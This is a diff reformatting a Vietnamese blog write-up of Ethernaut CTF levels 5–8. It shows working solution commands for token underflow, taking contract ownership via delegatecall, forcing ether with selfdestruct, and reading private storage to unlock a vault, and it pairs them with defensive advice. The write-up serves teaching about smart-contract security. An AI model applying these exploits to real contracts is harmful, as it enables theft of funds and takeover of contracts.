@@ -1,15 +1,17 @@
 ---
 layout: post
-title: "The Ethernaut - Part 2: 5-8"
+title: 'The Ethernaut - Part 2: 5-8'
 mathjax: true
 ---
-Chào các bạn, hôm nay chúng ta sẽ đến với phần 2 của chuỗi bài *Blockchain - hacking smart contract with Ethernaut CTF*
+
+Chào các bạn, hôm nay chúng ta sẽ đến với phần 2 của chuỗi bài _Blockchain - hacking smart contract with Ethernaut CTF_
 
 Ở bài trước, chúng ta đã được tiếp cận với những lỗ hổng cơ bản và dễ dàng nhất, ở phần này chúng ta sẽ tiếp cận 4 lỗ hổng khác với độ khó cao hơn, mình sẽ giải thích từng bước cụ thể kèm phân tích để các bạn có thể nắm được trực quan và đơn giản nhất.
 
 Hi vọng sẽ mang lại nhiều điều thú vị cho các bạn.
 
-## 5. Token 　★★★☆☆☆
+## 5. Token 　 ★★★☆☆☆
+
 **Nhiệm vụ**: Có 20 token trong tay, ta cần chôm ở đâu đó vài token nữa (càng nhiều càng tốt)
 
 ```js
@@ -44,10 +46,10 @@ contract Token {
 - Ở đây ta có đoạn
 
 ```js
-require(balances[msg.sender] - _value >= 0);
+require(balances[msg.sender] - _value >= 0)
 ```
 
-những tưởng rằng điều kiện này chỉ đạt được khi balance của msg.sender lớn hơn giá trị value; nhưng không, điều kiện này sẽ trở thành auto true. Thật vậy, nếu như `balance >= value` thì hiển nhiên sẽ là *true*, còn nếu như `balance < value` thì khi `balance - value`  sẽ xảy ra hiện tượng `underflow` và trở nên vô cùng lớn, theo đó điệu kiện cũng sẽ là *true*. Tóm lại, ta sẽ luôn luôn pass.
+những tưởng rằng điều kiện này chỉ đạt được khi balance của msg.sender lớn hơn giá trị value; nhưng không, điều kiện này sẽ trở thành auto true. Thật vậy, nếu như `balance >= value` thì hiển nhiên sẽ là _true_, còn nếu như `balance < value` thì khi `balance - value` sẽ xảy ra hiện tượng `underflow` và trở nên vô cùng lớn, theo đó điệu kiện cũng sẽ là _true_. Tóm lại, ta sẽ luôn luôn pass.
 
 ### Solution
 
@@ -58,7 +60,7 @@ await contract.balanceOf(player).then(x => x.toNumber())
 20
 ```
 
-- Do điều kiện auto pass, ta sẽ transfer cho một địa chỉ nào đó một giá trị lớn hơn 20 - là số token hiện tại của ta, khi đó phép toán `balances[msg.sender] -= value` sẽ xảy ra hiện tượng *underflow* và ta sẽ sở hữu một lượng **vô cùng lớn** token:
+- Do điều kiện auto pass, ta sẽ transfer cho một địa chỉ nào đó một giá trị lớn hơn 20 - là số token hiện tại của ta, khi đó phép toán `balances[msg.sender] -= value` sẽ xảy ra hiện tượng _underflow_ và ta sẽ sở hữu một lượng **vô cùng lớn** token:
 
 ```js
 contract.transfer(player, 21)
@@ -68,7 +70,7 @@ contract.transfer(player, 21)
 
 ```js
 await contract.balanceOf(player).then(x => x.toNumber())
-1.157920892373162e+77
+1.157920892373162e77
 ```
 
 - Submit & all done!
@@ -79,7 +81,7 @@ await contract.balanceOf(player).then(x => x.toNumber())
 
 - Overflow hay Underflow đều nguy hiểm, hãy dùng thư viện [Safe Math](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/math/SafeMath.sol) cho bất cứ phép toán nào của bạn.
 
-## 6. Delegation　★★★★☆☆
+## 6. Delegation 　 ★★★★☆☆
 
 **Nhiệm vụ**: Chiếm quyền owner.
 
@@ -119,13 +121,13 @@ contract Delegation {
 
 ### Phân tích
 
-- Để từ trong contract này gọi hàm của contract khác, ngoài cách dùng instance của contract khác để gọi, solidity cung cấp cho ta một số hàm *low-level* khác để thay thế: đó là `call` và `delegatecall`. Ngay từ chú thích *low-level* ta đã biết rằng đây là những hàm *nguy hiểm* rồi, nên việc hiểu rõ cách sử dụng chúng là một điều tất yếu.
+- Để từ trong contract này gọi hàm của contract khác, ngoài cách dùng instance của contract khác để gọi, solidity cung cấp cho ta một số hàm _low-level_ khác để thay thế: đó là `call` và `delegatecall`. Ngay từ chú thích _low-level_ ta đã biết rằng đây là những hàm _nguy hiểm_ rồi, nên việc hiểu rõ cách sử dụng chúng là một điều tất yếu.
 - Việc giải thích cụ thể về `call` và `delegatecall` khá dài và nằm ngoài phạm vi bài viết. Bạn có thể đọc thêm [tại đây](https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall). Cơ bản thì `delegatecall` chỉ mượn tên hàm của contract khác, mọi thông tin về storage vẫn là storage của contract đang sử dụng.
--  Contract *Delegate* có hàm `pwn()` để trao quyền owner, vậy mục tiêu của chúng ta là làm sao để kích hoạt được hàm này.
--  Contract *Delegation* có fallback function sử dụng `delegatecall`, nó gợi ý cho chúng ta trigger fallback với msg.data chính là hàm `pwn()`
--  Dù *fallback function* trong contract *Delegation* không có payable, nghĩa là không thể nhận ether, ta vẫn có thể kích hoạt được nó bằng cách send cho nó *0 ether*, thật là vi diệu!
--  Về *fallback function*, các bạn có thể tham khảo thêm tại [documentation của Solidity](http://solidity.readthedocs.io/en/v0.4.21/contracts.html#fallback-function) hoặc tại bài viết [phần 1](https://viblo.asia/p/blockchain-hacking-smart-contract-with-ethernaut-ctf-part-1-bWrZnN8pZxw)
--  Một lưu ý về *msg.data*: để truyền vào hàm `pwn()`, ta không phải truyền plain text, mà solidity sẽ gọi bằng *bytes4 hash* của nó, tức 4 byte đầu của chuỗi `hash("pwn()")` cụ thể ta sẽ phải truyền vào tham số như sau: `web3.sha3("pwn()").slice(0, 10)`
+- Contract _Delegate_ có hàm `pwn()` để trao quyền owner, vậy mục tiêu của chúng ta là làm sao để kích hoạt được hàm này.
+- Contract _Delegation_ có fallback function sử dụng `delegatecall`, nó gợi ý cho chúng ta trigger fallback với msg.data chính là hàm `pwn()`
+- Dù _fallback function_ trong contract _Delegation_ không có payable, nghĩa là không thể nhận ether, ta vẫn có thể kích hoạt được nó bằng cách send cho nó _0 ether_, thật là vi diệu!
+- Về _fallback function_, các bạn có thể tham khảo thêm tại [documentation của Solidity](http://solidity.readthedocs.io/en/v0.4.21/contracts.html#fallback-function) hoặc tại bài viết [phần 1](https://viblo.asia/p/blockchain-hacking-smart-contract-with-ethernaut-ctf-part-1-bWrZnN8pZxw)
+- Một lưu ý về _msg.data_: để truyền vào hàm `pwn()`, ta không phải truyền plain text, mà solidity sẽ gọi bằng _bytes4 hash_ của nó, tức 4 byte đầu của chuỗi `hash("pwn()")` cụ thể ta sẽ phải truyền vào tham số như sau: `web3.sha3("pwn()").slice(0, 10)`
 
 ### Solution
 
@@ -138,7 +140,7 @@ await contract.owner()
 - Send 0 ether kèm data để trigger fallback:
 
 ```js
-await contract.sendTransaction({data:web3.sha3("pwn()").slice(0,10)});
+await contract.sendTransaction({ data: web3.sha3('pwn()').slice(0, 10) })
 ```
 
 - Kiểm tra lại contract owner xem đã là mình chưa:
@@ -157,7 +159,7 @@ await contract.owner()
 - Hạn chế tối đa sử dụng `delegatecall` cũng như các hàm low-level khác.
 - Tham khảo thêm: https://consensys.github.io/smart-contract-best-practices/recommendations/#be-aware-of-the-tradeoffs-between-send-transfer-and-callvalue
 
-## 7. Force　★★★★★☆
+## 7. Force 　 ★★★★★☆
 
 **Nhiệm vụ**: Bằng cách nào đó chuyển cho một contract rỗng một ít ether.
 
@@ -178,7 +180,7 @@ contract Force {/*
 ### Phân tích
 
 - Contract không tí code nào - wtf ?
-- Đây là một bài thuộc dạng bài *biết thì rất dễ, không biết thì không biết đằng nào mà lần*. Điều ta cần biết duy nhất chính là hàm `selfdestruct`.
+- Đây là một bài thuộc dạng bài _biết thì rất dễ, không biết thì không biết đằng nào mà lần_. Điều ta cần biết duy nhất chính là hàm `selfdestruct`.
 - Với một contract, khi gọi hàm `selfdestruct(someone_addr)` thì contract sẽ hủy và toàn bộ tiền của contract sẽ gửi về someone_addr, đây có thể là địa chỉ bất kì của người dùng hoặc của contract nào đó.
 
 ### Solution
@@ -199,7 +201,7 @@ contract AnotherContract {
 }
 ```
 
-- Compile & send cho *AnotherContract* vài ether.
+- Compile & send cho _AnotherContract_ vài ether.
 - Gọi hàm `sendAll()` để hủy contract & gửi tiền vào contract đề bài yêu cầu.
 - Submit & all done!
 
@@ -209,7 +211,7 @@ contract AnotherContract {
 
 - Bình luận gì nữa, cần phải tìm hiểu thêm nhiều thôi (okay).
 
-## 8. Vault　★★★☆☆☆　
+## 8. Vault 　 ★★★☆☆☆
 
 **Nhiệm vụ**: Tìm password và unlock
 
@@ -245,20 +247,24 @@ contract Vault {
 - Trong chrome console, ta chạy lệnh sau
 
 ```js
-web3.eth.getStorageAt("0x712d4d349abd61d1ff12be06f8ff55cc7fb1052b", 1, (err, result) => alert(web3.toAscii(result)))
+web3.eth.getStorageAt(
+  '0x712d4d349abd61d1ff12be06f8ff55cc7fb1052b',
+  1,
+  (err, result) => alert(web3.toAscii(result))
+)
 ```
 
 - Yeah, ta nhận được password là: `A very strong secret password :)`
 - Tiến hành unlock:
 
 ```js
-await contract.unlock('A very strong secret password :)');
+await contract.unlock('A very strong secret password :)')
 ```
 
 - Kiểm tra lại tình trạng khóa:
 
 ```js
-await contract.locked.call();
+await contract.locked.call()
 false
 ```
 
@@ -272,15 +278,15 @@ false
 - Nếu muốn thông tin private, hãy mã hóa nó trước khi đưa lên blockchain.
 - Không nên lưu trữ các thông tin nhạy cảm trên blockchain, dù nó có được mã hóa hay không.
 
-
 ## Conclusion
+
 Vậy là chúng ta đã đi qua được 2/3 chặng đường, chúc các bạn có những giây phút vui vẻ.
 
 Enjoy coding!
 
 ## References
+
 - [The Ethernaut](https://ethernaut.zeppelin.solutions/)
 - [Remix](https://remix.ethereum.org/)
-- [Solidity Docs](http://solidity.readthedocs.io/en/develop/types.html#members-of-addresses
-)
+- [Solidity Docs](http://solidity.readthedocs.io/en/develop/types.html#members-of-addresses)
 - [Recommendations for Smart Contract Security in Solidity](https://consensys.github.io/smart-contract-best-practices/recommendations/#be-aware-of-the-tradeoffs-between-send-transfer-and-callvalue)
